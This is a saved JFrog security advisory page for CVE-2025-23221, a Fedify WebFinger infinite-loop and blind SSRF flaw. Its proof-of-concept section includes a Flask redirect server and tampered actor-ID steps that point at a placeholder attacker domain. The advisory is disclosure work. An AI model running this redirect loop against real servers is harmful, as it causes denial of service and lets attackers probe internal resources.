<!DOCTYPE html>
<html data-html-server-rendered="true" lang="en" data-vue-tag="%7B%22lang%22:%7B%22ssr%22:%22en%22%7D%7D">
  <head>
    <title>Fedify WebFinger Infinite Loop and Blind SSRF |  - JFrog Security Research</title><meta name="gridsome:hash" content="d983cd9ec9e5f0d3250db8648a44004f0cffc42c"><meta data-vue-tag="ssr" charset="utf-8"><meta data-vue-tag="ssr" name="generator" content="Gridsome v0.7.23"><meta data-vue-tag="ssr" data-key="viewport" name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover"><meta data-vue-tag="ssr" data-key="format-detection" name="format-detection" content="telephone=no"><meta data-vue-tag="ssr" name="referrer" content="origin"><meta data-vue-tag="ssr" http-equiv="Content-Security-Policy" content="default-src *  &#x27;self&#x27; &#x27;unsafe-eval&#x27; &#x27;unsafe-inline&#x27;  https://jfrog.com; img-src &#x27;self&#x27; * data: ; font-src &#x27;self&#x27; * data: ;"><meta data-vue-tag="ssr" name="title" content="Fedify WebFinger Infinite Loop and Blind SSRF | "><meta data-vue-tag="ssr" name="description" content="CVE-2025-23221 Medium severity. Infinite loop and Blind SSRF found inside the WebFinger mechanism"><link data-vue-tag="ssr" rel="icon" href="data:,"><link data-vue-tag="ssr" rel="icon" type="image/png" sizes="16x16" href="/assets/static/favicon.ce0531f.ebe1c983be3d8af04d6186b36f13b87c.png"><link data-vue-tag="ssr" rel="icon" type="image/png" sizes="32x32" href="/assets/static/favicon.ac8d93a.ebe1c983be3d8af04d6186b36f13b87c.png"><link data-vue-tag="ssr" rel="icon" type="image/png" sizes="96x96" href="/assets/static/favicon.b9532cc.ebe1c983be3d8af04d6186b36f13b87c.png"><link data-vue-tag="ssr" rel="apple-touch-icon" type="image/png" sizes="76x76" href="/assets/static/favicon.f22e9f3.ebe1c983be3d8af04d6186b36f13b87c.png"><link data-vue-tag="ssr" rel="apple-touch-icon" type="image/png" sizes="152x152" href="/assets/static/favicon.62d22cb.ebe1c983be3d8af04d6186b36f13b87c.png"><link data-vue-tag="ssr" rel="apple-touch-icon" type="image/png" sizes="120x120" href="/assets/static/favicon.1539b60.ebe1c983be3d8af04d6186b36f13b87c.png"><link data-vue-tag="ssr" rel="apple-touch-icon" type="image/png" sizes="167x167" href="/assets/static/favicon.dc0cdc5.ebe1c983be3d8af04d6186b36f13b87c.png"><link data-vue-tag="ssr" rel="apple-touch-icon" type="image/png" sizes="180x180" href="/assets/static/favicon.7b22250.ebe1c983be3d8af04d6186b36f13b87c.png"><link data-vue-tag="ssr" rel="canonical" content="https://research.jfrog.com/vulnerabilities/fedify-infinite-loop-blind-ssrf/"><link rel="preload" href="/assets/css/0.styles.4ce946dc.css" as="style"><link rel="preload" href="/assets/js/app.35b5555f.js" as="script"><link rel="preload" href="/assets/js/page--src--templates--post-vue.d2ee2512.js" as="script"><link rel="prefetch" href="/assets/js/page--src--pages--404-vue.9f141ac9.js"><link rel="prefetch" href="/assets/js/page--src--pages--index-vue.7e72b086.js"><link rel="prefetch" href="/assets/js/page--src--pages--index-vue~page--src--pages--malicious-packages-vue.290eb3ad.js"><link rel="prefetch" href="/assets/js/page--src--pages--malicious-packages-vue.20041e6d.js"><link rel="prefetch" href="/assets/js/page--src--pages--model-threats-vue.1c77f21c.js"><link rel="prefetch" href="/assets/js/page--src--pages--oss-vue.8664726d.js"><link rel="prefetch" href="/assets/js/page--src--pages--post-vue.6e8b797a.js"><link rel="prefetch" href="/assets/js/page--src--pages--vulnerabilities-vue.8ae8e253.js"><link rel="prefetch" href="/assets/js/page--src--templates--model-threats-post-vue.ecc53922.js"><link rel="prefetch" href="/assets/js/page--src--templates--real-time-post-vue.3b205ae6.js"><link rel="prefetch" href="/assets/js/vendors~page--src--pages--index-vue.2ec3d7ff.js"><link rel="prefetch" href="/assets/js/vendors~page--src--templates--model-threats-post-vue~page--src--templates--real-time-post-vue.7f393094.js"><link rel="prefetch" href="/assets/js/vendors~page--src--templates--real-time-post-vue.114325c7.js"><link rel="stylesheet" href="/assets/css/0.styles.4ce946dc.css"><script data-vue-tag="ssr" src="/speedsize-local.js"></script><script data-vue-tag="ssr" src="https://transcend-cdn.com/cm/f0071674-c641-4cf3-9d31-303ec0c86b1b/airgap.js" data-languages="en" data-tracker-overrides="GoogleConsentMode:security_storage=on;ad_storage=SaleOfInfo,Advertising;ad_user_data=SaleOfInfo,Advertising;ad_personalization=SaleOfInfo,Advertising;analytics_storage=Analytics,SaleOfInfo;functionality_storage=Functional,SaleOfInfo;personalization_storage=Functional,SaleOfInfo" data-cfasync="false" type="text/javascript" charset="utf-8"></script><script data-vue-tag="ssr" type="text/javascript" charset="utf-8">
      window.dataLayer = window.dataLayer || [];
      function gtag() {
        dataLayer.push(arguments);
      }
      gtag("js", new Date());
      gtag("config", "GTM-T6MF8M");
      gtag('set', 'developer_id.dODQ2Mj', true);
    </script><noscript data-vue-tag="ssr"><style>.g-image--loading{display:none;}</style></noscript>
  </head>
  <body >
    <div data-server-rendered="true" id="app" class="layout"><header class="py-2 main-header"><div class="container mx-auto px-2"><div class="flex w-full justify-between items-center"><div class="left"><div class="flex items-center gap-2"><a href="/" class="logo active"><img alt="JFrog Security Research" src="/assets/static/jfrog-logo-svg.5788598.74a3bea875bf053c65a0663c9ec9a0fd.svg" width="40" srcset="/assets/static/jfrog-logo-svg.5788598.74a3bea875bf053c65a0663c9ec9a0fd.svg 40w" sizes="(max-width: 40px) 100vw, 40px" class="g-image"></a><span class="site-name small">JFrog Security Research</span></div></div><div class="right"><div class="hidden sm:block desktop-menu-wrapper"><ul class="top-menu flex items-center"><li class="menu-item"><a href="/model-threats/" class="font-bold px-3">
      Model Threats
    </a><a href="/vulnerabilities/" class="font-bold px-3 mx-3 active">
      Discover
    </a></li><li><a href="https://twitter.com/JFrogSecurity" target="_blank" rel="noreferrer noopener noreferrer" class="sr-button px-3 py-2 inline-flex gap-2">
  Follow JFrog Security
  <img alt="twitter" src="/assets/static/twitter.e0519be.9769aec62433fd58c76ad32c2d613842.svg" width="14" srcset="/assets/static/twitter.e0519be.9769aec62433fd58c76ad32c2d613842.svg 14w" sizes="(max-width: 14px) 100vw, 14px" class="g-image"></a></li></ul></div><div class="sm:hidden flex item-center mobile-menu-wrapper gap-2"><!----><button class="show-menu-hamburger px-1"><img alt="Menu" src="/assets/static/hamburger.a58a0fd.dc5087fee70346d455e75c87bc430716.svg" width="22" srcset="/assets/static/hamburger.a58a0fd.dc5087fee70346d455e75c87bc430716.svg 22w" sizes="(max-width: 22px) 100vw, 22px" class="g-image"></button></div></div></div></div><div class="fixed mobile-menu h-screen w-screen z-50 bg-white text-gray-700 p-5 inset-0" style="display:none;"><div class="flex justify-end mb-3"><button class="p-3"><img alt="Menu" src="data:image/svg+xml,%3csvg fill='none' viewBox='0 0 12 12' xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink'%3e%3cdefs%3e%3cfilter id='__svg-blur-ed66a5bf1eb83ec14d27c7d6a4278d79'%3e%3cfeGaussianBlur in='SourceGraphic' stdDeviation='40'/%3e%3c/filter%3e%3c/defs%3e%3cimage x='0' y='0' filter='url(%23__svg-blur-ed66a5bf1eb83ec14d27c7d6a4278d79)' width='12' height='12' xlink:href='data:image/svg%2bxml%3bbase64%2ciVBORw0KGgoAAAANSUhEUgAAAEAAAABACAYAAACqaXHeAAAACXBIWXMAAAsTAAALEwEAmpwYAAAJfklEQVR42u2bCWwVVRSGpwtQWpa2UFpkEWRvUQFBNEqkFMoiIogKFWsFKiAYTTBRoiwulD0KERLBoKAiZRN3UCEiUUBFRWURBFxABCn70va1FM99fhOuw8xjmzd9yXOSP236%2bmbO%2bp9zz71jGOdf8YIWgk6CewU5gvsEPQRtBfUFVQUVjNC6KiBXfeTsgdw56NEJveIvdKNqgmaCdME9gmxBf0E3QRtBXUGcICrEDBCFXHWRsxtyZ6NHOnpVu9CNEgSpgs7cYKDgfkFPQXtBQ6xYSRAZIspHIk888rVH3vuRvz/6pKKf4xUjqCNoJ7hTkCt4VDBcMEDQVdBa0EBQS1BdUJnwiywHpSvw/OrI0wD5uiLvcOTPRZ926BdjzXl1g0Q%2bbCW4XTBUMEYwSZAnGCUYIugj6EiYNRGkkHvRHhsgmuemIEcb5OqDnKOQexJ6DEWvVuiZiN5%2bYmguSMNC6p%2bG8eVXBYsFiwSvCV4UPC14WNAPYmkpSBZU9NgAlVC%2bJXL0Qy4l3wvIuwj556LPMPRrh75KbyMDgugi6I2lJggWCNYIvhN8L9gg%2bESQL5gpGCcYzPcbQ0BeXlXwfAZyjEOufORcj9xK/s/QJw/9eqOv0ttvOVUmsgQPCcbieaX8TkGB4KjgoOA3wSbBKsGbgufINWXRJEGEh/mfxHMHIMebyLUJOQ8idwF6rEGvseiZRXUwHhQ8IBgkeEwwWbAEy6kvn9Xg4287BJ8TWo8LuguaklPRHuR%2bdZ7XnefPRZ4dyOezyF2APkvQ7zH0VXr7m4Us6uVwwn8x4XPUciOFUqy7RfC%2bYBoWzSCv6kCslV1slqI1tr%2bKctYJdp%2bGHFuQq9RG5mNExmL0G4G%2bSm9/x6SahjsIp1EQyAZueNYGhYK9gq8gmkkQkGLgWyAXRVCxLhkghjKnvH4zJc3kqnzk2ItcdvIe4n/mCZ6iP%2bhFBPnbxjY0D5l4U7Hox%2bSSz%2baGZ4iO3YJ1gmUQ0NM0Hp2pLoku8YIZ8ul4TjlpBiH9BTl%2bBLnsZN0DP8ygEnTDkEp3f%2b9cR2si%2bqDIQtJARUGJzY2LBIcFv2vEuACvKCN0ENRzoTyqFrc2Aivln8WTKwUbcUIB8th5XznqJ4ylCPBuFG%2bE7v5yEouVrxbchpVeEnwq2I4RTlvyq4zoOMXnO4mGBTQefQXXEgWXS4wRyNWCkB2F8orwtgn%2bEhwXFNt4v5io2EUFeFnwCNxxDXJVNQkmEk8lEQX3Yq03%2bPJmwugIeWZ9WAmfKSOsFsziYZkIn8IiJIbnRQRQOApZVF9Rk1qfTs5PF6xA%2bYPIUmZxSjFGUcb5WfAlPPE8hN8OeSpbHROBkI154CDC7RXBe5Ci2RcU24RaCUL9IFgumEokKXK9iRxOIeIiAxggFkc0IlS70eiY1WkjyhU6yKAc8Sv/t4KImUB73IUVYbxTVMYgZBqhoiw2EmUWQji7sXCZjQAqHf6AcZfhsSept525b1KAlIgkNJvR12dpz8/Xnn8swPN/x1lLad2f4PkqGq%2bjjMY6RaE5VEgmEnQP5F2CB1T1%2bBaims93c4mshoSf3VURYurAIOMZIvD9i4hAHxGoCPltwRTSpicR2AwyrRaImCPxjl0ODsGjKy8yB/dDoGYOPsu6vDX3jXKYRl0LgY4WvK5x0N4AHOTTOGgVHDSCkG%2bOQ6sS4Ze0dL9cFjYNcRgWVv8/hxY0E2/UwsiViIhE8j6dpmomyigi%2b9uhCpU4VCFlvLtYKSZc6fTqYuuwU0ocwoPv0IfnMrBoj7dbwA03wDsqX8dTt1UfcsChxptl7g%2bI19qH3Mp4zJV23K4Tmw4n6J1YqUPbvEfzzkRtMZJFye2H4sNZ2SneWAubn7S5ZxmR9xvcsJywH23pRBPcWoFZe/Fell58Azl62mHxdBg%2bWItnZ8PQk7nHRJhehf1b9BJbCW2fg/f3Q7RLIbwRhP2tWu/h1lrET4wxREJtHpBOdZgKS28mV4tsvFXIZ2q5%2bg0DCrXW%2bIAeQ%2bFDOs91KP8X%2bW3XdJkGXUEkDoPwWhL2CSgflNF9FIZoQokcSalaA2EdIGx9mvClKFNAzv4CiW6mT/%2bR37fBKeoeJ7Q1SBn3KIRTdlFd5lHne8L2CV7tV0RQytqSx89QslZBXL%2bi7CmUOMPP09p06QBhrDy9D%2bxHwROaAU3FD8Mlm6kqC%2bkvsiHUZK/3KuIoWx1pWkZDREvJdTOMTWVK%2bFmIYU6CExCaiVOkUYlW5v4m5NdRTWZTjcyZZBNzYePlZS6emtO59YXFx8PiJpGZKVGMAYq1333a34owTpH299OWEdwChi%2bPUjk6Mh1Kpp/wfCsqlgamPjU9nWh4DjZfTzoc0jzr09KiTEOpxSCFpMseiHMJFWMwhNeKGUZNotHrfQk/D0RoS%2bl4UiKDSJgFq28jt4%2bjlM%2bhXzDJsgQDnLJMdGdrnaQqxzWoTFHIEGGEwJVIR5dNefwAlt%2bHAYoCKK%2bPsPQWdztz/uk0T%2b1JvVDZlzyvYUqlu1MM/S5t6p8sYYsd5nZ2kWCSn4qgjzDoAJa0cUaIXhVY6PSFDN9heaoboOwSDbCVJmkyq8k06%2bZmOEZAlVA1gFccUMsIgQMaXlcBc57QlTSrqQ02y6UKlEcfMJE%2bIJPJUkMqQpXy6AO87gTX0glOphPsj8HT6AQ9J0av1wI7tLXAHNYCuQw/mhoXcfgplFaDBS6sBvOpNA8w9U3xKg1CaR4wn32HO7TN2IrBIMRgTIRWujARWqlNhDIh4noYwtWJkFszwc8ZpLo5E1zGd0dAxB2CMRN0cyo8ARYfaJw7p3MlU%2bGvtKnwGJqlLoaL5xPc3BeYpNXxGxliNrfsC%2bRc5r7Aas3AgwyXzie4uTM0G893IZqSCNGKQdgZuuzzCcHaG1xI5PSjg6vhsJ53Y29wtWVv0Ho%2bIeDeoNu7w%2bb%2bfB736Ej7GhPE3WHzfMIU47/nE5qxNV49UFq4dT7A3J%2bfztw%2bm0VSKlHl1fkA83xCDrxzvfHveag4uyhw%2b4SI6QHzmH0TIivO8PaEyHzj3AmRTMsGSoRhuH9GKND%2bfCWjfM8Imcd6a%2buNUjBOibm1Px%2bMU2IZRFcNcwHl9jnBPMPd/flgnRNsjMOv%2bKToesP5pKhb%2b/NunxTtbmgnRa/krPDXhvNZ4WQj9M4KK0J8CiP2Qvf/T4uH/fsC4fLGyGfoNcawvDES9u8Mhf1bY%2bHy3uAQw%2bG9QWu5Cbs3R61XWL87bBhh9vb4P/%2bX4wkCBpt7AAAAAElFTkSuQmCC' /%3e%3c/svg%3e" width="12" data-src="/assets/static/close.5cd2673.91b568c73f917f773ea7915d69802829.svg" data-srcset="/assets/static/close.5cd2673.91b568c73f917f773ea7915d69802829.svg 12w" data-sizes="(max-width: 12px) 100vw, 12px" class="g-image g-image--lazy g-image--loading"><noscript><img src="/assets/static/close.5cd2673.91b568c73f917f773ea7915d69802829.svg" class="g-image g-image--loaded" width="12" alt="Menu"></noscript></button></div><ul class="mobile-menu-list"><li class="py-4 px-2 border-t border-gray-200"><a href="/" class="text-gray-700 active">
        Home
      </a></li><li class="py-4 px-2 border-t border-gray-200"><a href="/model-threats/" class="text-gray-700">
        Model Threats
      </a></li><li class="py-4 px-2 border-t border-gray-200"><a href="/vulnerabilities/" class="text-gray-700 active">
        Discover
      </a></li><li class="py-4 px-2 border-t border-gray-200"><a href="https://twitter.com/JFrogSecurity" target="_blank" rel="noopener" class="text-gray-700">
        Follow JFrog Security
      </a></li></ul></div></header><div class="container py-10"><a href="/vulnerabilities/" class="hover:text-jfrog-green transition-all active">< Back</a><section class="single-post-hero mt-3 py-5 sm:py-8 px-4 sm:px-10 bg-gray-100 text-black"><h1> - Fedify WebFinger Infinite Loop and Blind SSRF</h1><p class="text-jfrog-green font-bold"> 
    CVE-2025-23221
    <span class="cvss">
      | CVSS 5.4
    </span></p><p class="severity mt-1 flex gap-2 items-center"><span class="inline-block rounded-full w-4 h-4 bg-yellow-500"></span> JFrog Severity:<span class="capitalize">medium</span></p><div class="discovered-by text-sm flex gap-1 items-center mt-4"><span class="text">Discovered By</span><strong>Natan Nehorai</strong><span class="text">of the JFrog Security Research Team</span></div><p class="dates font-bold text-sm mt-4">
    Published 20 Jan, 2025 | Last updated 20 Jan, 2025
  </p></section><section class="single-post-content mt-3 py-5 sm:py-8 px-4 sm:px-10 text-black border-black border-b text-xs"><h2 id="summary"><a href="#summary" aria-hidden="true" tabindex="-1">Summary</a></h2>
<p>This vulnerability allows a user to maneuver the Webfinger mechanism to perform a GET request to any internal resource on any Host, Port, URL combination regardless of present security mechanisms, and forcing the victim’s server into an infinite loop causing Denial of Service.
Moreover, this issue can also be maneuvered into performing a Blind SSRF attack.</p>
<h2 id="component"><a href="#component" aria-hidden="true" tabindex="-1">Component</a></h2>
<p><a href="https://www.npmjs.com/package/@fedify/fedify" target="_blank" rel="nofollow noopener noreferrer">@fedify/fedify</a></p>
<h2 id="affected-versions"><a href="#affected-versions" aria-hidden="true" tabindex="-1">Affected versions</a></h2>
<p>(,1.0.13]</p>
<p>(,1.1.10]</p>
<p>(,1.2.10]</p>
<p>(,1.3.3]</p>
<h2 id="description"><a href="#description" aria-hidden="true" tabindex="-1">Description</a></h2>
<p>The Webfinger endpoint takes a remote domain for checking accounts as a feature, however, as per the ActivityPub spec (<a href="https://www.w3.org/TR/activitypub/#security-considerations" target="_blank" rel="nofollow noopener noreferrer">https://www.w3.org/TR/activitypub/#security-considerations</a>), on the security considerations section at B.3, access to Localhost services should be prevented while running in production.</p>
<p>The <strong>lookupWebFinger</strong> function, responsible for returning an actor handler for received actor objects from a remote server, can be abused to perform a Denial of Service (DoS) and Blind SSRF attacks while attempting to resolve a malicious actor’s object.</p>
<h2 id="poc"><a href="#poc" aria-hidden="true" tabindex="-1">PoC</a></h2>
<ol>
<li>In order to show a use case of the vulnerability, we can use the demo app presented at this URL: <a href="https://github.com/dahlia/microblog" target="_blank" rel="nofollow noopener noreferrer">https://github.com/dahlia/microblog</a></li>
<li>We will create two machines, victim and attacker, each one on a different server with different domains.</li>
</ol>
<p><strong><em>Victim Machine</em></strong></p>
<ol>
<li>Create a new instance (we tested on ubuntu’s latest version), and update the package manager.</li>
</ol>
<ol start="2">
<li>Install a Deno server:
<code>curl -fsSL https://deno.land/install.sh | sh</code>
<code>source ~/.bashrc</code>
<code>deno --version #check deno is working</code></li>
</ol>
<ol start="3">
<li>Pull the git repository of the victim blog app:
<code>git clone https://github.com/dahlia/fedify.git</code></li>
</ol>
<ol start="4">
<li>Modify the federation object to remove signature checks for the sake of easy testing:
On file <strong><em>/examples/blog/federation/mod.ts</em></strong> edit the <strong><em>createFederation<void></em></strong> object the following attribute: <strong><em>skipSignatureVerification: true</em></strong>.</li>
</ol>
<ol start="5">
<li>Change into the blog app directory ( /examples/blog ) and run the app:
<code>deno task preview</code></li>
</ol>
<ol start="6">
<li>Surf to the application on the browser, and register a user on the app.</li>
</ol>
<p><strong><em>Attacker Machine</em></strong></p>
<ol>
<li>Create a new instance (we tested on ubuntu’s latest version), and update the package manager.</li>
</ol>
<ol start="2">
<li>Install NVM in order to install the latest version of NPM and NODEJS (and source current shell to check it worked):
<code>curl -o- https://raw.githubusercontent.com/nvm-sh/nvm/v0.40.1/install.sh | bash</code>
<code>source ~/.bashrc</code>
<code>nvm list-remote</code></li>
</ol>
<ol start="3">
<li>Install the latest stable version:
<code>nvm install {latest_ver} #for example: v20.10.0</code>
<code>source ~/.bashrc</code>
<code>npm -v #check it works</code>
<code>node -v #check it works</code></li>
</ol>
<ol start="4">
<li>Download the attacker app repository:
<code>git clone https://github.com/dahlia/microblog.git</code></li>
</ol>
<ol start="5">
<li>Disable request signature validations:
Edit the <strong><em>/src/federation.ts</em></strong> file and add a <strong><em>skipSignatureVerification: true</em></strong> attribute to the <strong><em>createFederation</em></strong> object.</li>
</ol>
<ol start="6">
<li>Modify the <strong><em>/src/federation.ts</em></strong> file and tamper with the Person object on the actor dispatcher ( <strong><em>setActorDispatcher(\"/users/{identifier}\"</em></strong> ) - change the actor ID attribute <strong><em>“id: ctx.getActorUri(identifier)</em></strong>” into “<strong><em>id: new URL(‘http://&#x3C;ATTACKER_MACHINE_DOMAIN>:1337/users/enterloop’)</em></strong>”.</li>
</ol>
<ol start="7">
<li>Install Python flask and create the Python Flask redirect server:
<code>apt update</code>
<code>apt install python3-flask</code></li>
</ol>
<pre><code class="language-python">from flask import Flask, redirect

app = Flask(__name__)

@app.route('/health')
def health():
    return \"hello\", 200

@app.route('/.well-known/webfinger')
def ssrfinger():
    return redirect(\"http://&#x3C;ATTACKER_MACHINE_DOMAIN>:1337/endlessloop\")

@app.route('/endlessloop')
def endlessloop():
    return redirect(\"http://&#x3C;ATTACKER_MACHINE_DOMAIN>:1337/endlessloop\")

if __name__ == '__main__':
    app.run(debug=True,host='0.0.0.0' ,port=1337)
</code></pre>
<ol start="8">
<li>Run the python server and attempt to reach the “<strong><em>/health</em></strong>” path to see the server functions as expected.</li>
</ol>
<ol start="9">
<li>Read the <strong><em>README.txt</em></strong> file on the attacker app and follow the instructions on how to execute the app.</li>
</ol>
<ol start="10">
<li>Surf the app on the browser and attempt to follow the federated user on the victim’s machine.</li>
</ol>
<ol start="11">
<li>Send the “follow” request and watch the victim app continue to query the redirect server infinitely (It is possible to repeat this step multiple times causing multiple loops).</li>
</ol>
<h2 id="vulnerability-mitigations"><a href="#vulnerability-mitigations" aria-hidden="true" tabindex="-1">Vulnerability Mitigations</a></h2>
<p>No mitigations are provided for this vulnerability.</p>
<h2 id="references"><a href="#references" aria-hidden="true" tabindex="-1">References</a></h2>
<p><a href="https://github.com/fedify-dev/fedify/security/advisories/GHSA-c59p-wq67-24wx" target="_blank" rel="nofollow noopener noreferrer">GHSA</a></p>
</section><a href="/vulnerabilities/" class="hover:text-jfrog-green transition-all active py-4">< Back</a></div><footer class="py-4 main-footer bg-black"><div class="container mx-auto px-2"><div class="flex w-full justify-center flex-col sm:flex-row sm:justify-between items-center flex-wrap gap-4"><div class="left"><div class="flex items-center gap-2"><a href="/" class="logo active"><img alt="JFrog Security Research" src="/assets/static/jfrog-logo-svg.5788598.74a3bea875bf053c65a0663c9ec9a0fd.svg" width="40" srcset="/assets/static/jfrog-logo-svg.5788598.74a3bea875bf053c65a0663c9ec9a0fd.svg 40w" sizes="(max-width: 40px) 100vw, 40px" class="g-image"></a></div></div><div class="right"><ul class="footer-menu flex flex-col sm:flex-row items-center"><li class="px-4 py-1 sm:border-r"><a href="https://jfrog.com/terms-of-use/" rel="noopener noreferrer" target="_blank" class="text-white">
              Terms of Use
            </a></li><li class="px-4 py-1 sm:border-r"><a href="https://jfrog.com/jfrog-cookies-policy/" rel="noopener noreferrer" target="_blank" class="text-white">
              Cookies Policy
            </a></li><li class="px-4 py-1 sm:border-r"><a href="https://jfrog.com/privacy-policy/" rel="noopener noreferrer" target="_blank" class="text-white">
              Privacy Policy
            </a></li><li class="px-4 py-1 sm:border-r"><a href="#" rel="noopener noreferrer" target="_self" class="text-white ot-sdk-show-settings">
              Cookies Settings
            </a></li></ul></div></div><p class="sm:hidden text-center text-white pt-3">
      ©2025 All Rights Reserved. JFrog Ltd.
    </p></div></footer></div>
    <script>window.__INITIAL_STATE__={"data":{"post":{"title":"Fedify WebFinger Infinite Loop and Blind SSRF","path":"\u002Fvulnerabilities\u002Ffedify-infinite-loop-blind-ssrf\u002F","content":"\u003Ch2 id=\"summary\"\u003E\u003Ca href=\"#summary\" aria-hidden=\"true\" tabindex=\"-1\"\u003ESummary\u003C\u002Fa\u003E\u003C\u002Fh2\u003E\n\u003Cp\u003EThis vulnerability allows a user to maneuver the Webfinger mechanism to perform a GET request to any internal resource on any Host, Port, URL combination regardless of present security mechanisms, and forcing the victim’s server into an infinite loop causing Denial of Service.\nMoreover, this issue can also be maneuvered into performing a Blind SSRF attack.\u003C\u002Fp\u003E\n\u003Ch2 id=\"component\"\u003E\u003Ca href=\"#component\" aria-hidden=\"true\" tabindex=\"-1\"\u003EComponent\u003C\u002Fa\u003E\u003C\u002Fh2\u003E\n\u003Cp\u003E\u003Ca href=\"https:\u002F\u002Fwww.npmjs.com\u002Fpackage\u002F@fedify\u002Ffedify\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003E@fedify\u002Ffedify\u003C\u002Fa\u003E\u003C\u002Fp\u003E\n\u003Ch2 id=\"affected-versions\"\u003E\u003Ca href=\"#affected-versions\" aria-hidden=\"true\" tabindex=\"-1\"\u003EAffected versions\u003C\u002Fa\u003E\u003C\u002Fh2\u003E\n\u003Cp\u003E(,1.0.13]\u003C\u002Fp\u003E\n\u003Cp\u003E(,1.1.10]\u003C\u002Fp\u003E\n\u003Cp\u003E(,1.2.10]\u003C\u002Fp\u003E\n\u003Cp\u003E(,1.3.3]\u003C\u002Fp\u003E\n\u003Ch2 id=\"description\"\u003E\u003Ca href=\"#description\" aria-hidden=\"true\" tabindex=\"-1\"\u003EDescription\u003C\u002Fa\u003E\u003C\u002Fh2\u003E\n\u003Cp\u003EThe Webfinger endpoint takes a remote domain for checking accounts as a feature, however, as per the ActivityPub spec (\u003Ca href=\"https:\u002F\u002Fwww.w3.org\u002FTR\u002Factivitypub\u002F#security-considerations\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003Ehttps:\u002F\u002Fwww.w3.org\u002FTR\u002Factivitypub\u002F#security-considerations\u003C\u002Fa\u003E), on the security considerations section at B.3, access to Localhost services should be prevented while running in production.\u003C\u002Fp\u003E\n\u003Cp\u003EThe \u003Cstrong\u003ElookupWebFinger\u003C\u002Fstrong\u003E function, responsible for returning an actor handler for received actor objects from a remote server, can be abused to perform a Denial of Service (DoS) and Blind SSRF attacks while attempting to resolve a malicious actor’s object.\u003C\u002Fp\u003E\n\u003Ch2 id=\"poc\"\u003E\u003Ca href=\"#poc\" aria-hidden=\"true\" tabindex=\"-1\"\u003EPoC\u003C\u002Fa\u003E\u003C\u002Fh2\u003E\n\u003Col\u003E\n\u003Cli\u003EIn order to show a use case of the vulnerability, we can use the demo app presented at this URL: \u003Ca href=\"https:\u002F\u002Fgithub.com\u002Fdahlia\u002Fmicroblog\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003Ehttps:\u002F\u002Fgithub.com\u002Fdahlia\u002Fmicroblog\u003C\u002Fa\u003E\u003C\u002Fli\u003E\n\u003Cli\u003EWe will create two machines, victim and attacker, each one on a different server with different domains.\u003C\u002Fli\u003E\n\u003C\u002Fol\u003E\n\u003Cp\u003E\u003Cstrong\u003E\u003Cem\u003EVictim Machine\u003C\u002Fem\u003E\u003C\u002Fstrong\u003E\u003C\u002Fp\u003E\n\u003Col\u003E\n\u003Cli\u003ECreate a new instance (we tested on ubuntu’s latest version), and update the package manager.\u003C\u002Fli\u003E\n\u003C\u002Fol\u003E\n\u003Col start=\"2\"\u003E\n\u003Cli\u003EInstall a Deno server:\n\u003Ccode\u003Ecurl -fsSL https:\u002F\u002Fdeno.land\u002Finstall.sh | sh\u003C\u002Fcode\u003E\n\u003Ccode\u003Esource ~\u002F.bashrc\u003C\u002Fcode\u003E\n\u003Ccode\u003Edeno --version #check deno is working\u003C\u002Fcode\u003E\u003C\u002Fli\u003E\n\u003C\u002Fol\u003E\n\u003Col start=\"3\"\u003E\n\u003Cli\u003EPull the git repository of the victim blog app:\n\u003Ccode\u003Egit clone https:\u002F\u002Fgithub.com\u002Fdahlia\u002Ffedify.git\u003C\u002Fcode\u003E\u003C\u002Fli\u003E\n\u003C\u002Fol\u003E\n\u003Col start=\"4\"\u003E\n\u003Cli\u003EModify the federation object to remove signature checks for the sake of easy testing:\nOn file \u003Cstrong\u003E\u003Cem\u003E\u002Fexamples\u002Fblog\u002Ffederation\u002Fmod.ts\u003C\u002Fem\u003E\u003C\u002Fstrong\u003E edit the \u003Cstrong\u003E\u003Cem\u003EcreateFederation\u003Cvoid\u003E\u003C\u002Fem\u003E\u003C\u002Fstrong\u003E object the following attribute: \u003Cstrong\u003E\u003Cem\u003EskipSignatureVerification: true\u003C\u002Fem\u003E\u003C\u002Fstrong\u003E.\u003C\u002Fli\u003E\n\u003C\u002Fol\u003E\n\u003Col start=\"5\"\u003E\n\u003Cli\u003EChange into the blog app directory ( \u002Fexamples\u002Fblog ) and run the app:\n\u003Ccode\u003Edeno task preview\u003C\u002Fcode\u003E\u003C\u002Fli\u003E\n\u003C\u002Fol\u003E\n\u003Col start=\"6\"\u003E\n\u003Cli\u003ESurf to the application on the browser, and register a user on the app.\u003C\u002Fli\u003E\n\u003C\u002Fol\u003E\n\u003Cp\u003E\u003Cstrong\u003E\u003Cem\u003EAttacker Machine\u003C\u002Fem\u003E\u003C\u002Fstrong\u003E\u003C\u002Fp\u003E\n\u003Col\u003E\n\u003Cli\u003ECreate a new instance (we tested on ubuntu’s latest version), and update the package manager.\u003C\u002Fli\u003E\n\u003C\u002Fol\u003E\n\u003Col start=\"2\"\u003E\n\u003Cli\u003EInstall NVM in order to install the latest version of NPM and NODEJS (and source current shell to check it worked):\n\u003Ccode\u003Ecurl -o- https:\u002F\u002Fraw.githubusercontent.com\u002Fnvm-sh\u002Fnvm\u002Fv0.40.1\u002Finstall.sh | bash\u003C\u002Fcode\u003E\n\u003Ccode\u003Esource ~\u002F.bashrc\u003C\u002Fcode\u003E\n\u003Ccode\u003Envm list-remote\u003C\u002Fcode\u003E\u003C\u002Fli\u003E\n\u003C\u002Fol\u003E\n\u003Col start=\"3\"\u003E\n\u003Cli\u003EInstall the latest stable version:\n\u003Ccode\u003Envm install {latest_ver} #for example: v20.10.0\u003C\u002Fcode\u003E\n\u003Ccode\u003Esource ~\u002F.bashrc\u003C\u002Fcode\u003E\n\u003Ccode\u003Enpm -v #check it works\u003C\u002Fcode\u003E\n\u003Ccode\u003Enode -v #check it works\u003C\u002Fcode\u003E\u003C\u002Fli\u003E\n\u003C\u002Fol\u003E\n\u003Col start=\"4\"\u003E\n\u003Cli\u003EDownload the attacker app repository:\n\u003Ccode\u003Egit clone https:\u002F\u002Fgithub.com\u002Fdahlia\u002Fmicroblog.git\u003C\u002Fcode\u003E\u003C\u002Fli\u003E\n\u003C\u002Fol\u003E\n\u003Col start=\"5\"\u003E\n\u003Cli\u003EDisable request signature validations:\nEdit the \u003Cstrong\u003E\u003Cem\u003E\u002Fsrc\u002Ffederation.ts\u003C\u002Fem\u003E\u003C\u002Fstrong\u003E file and add 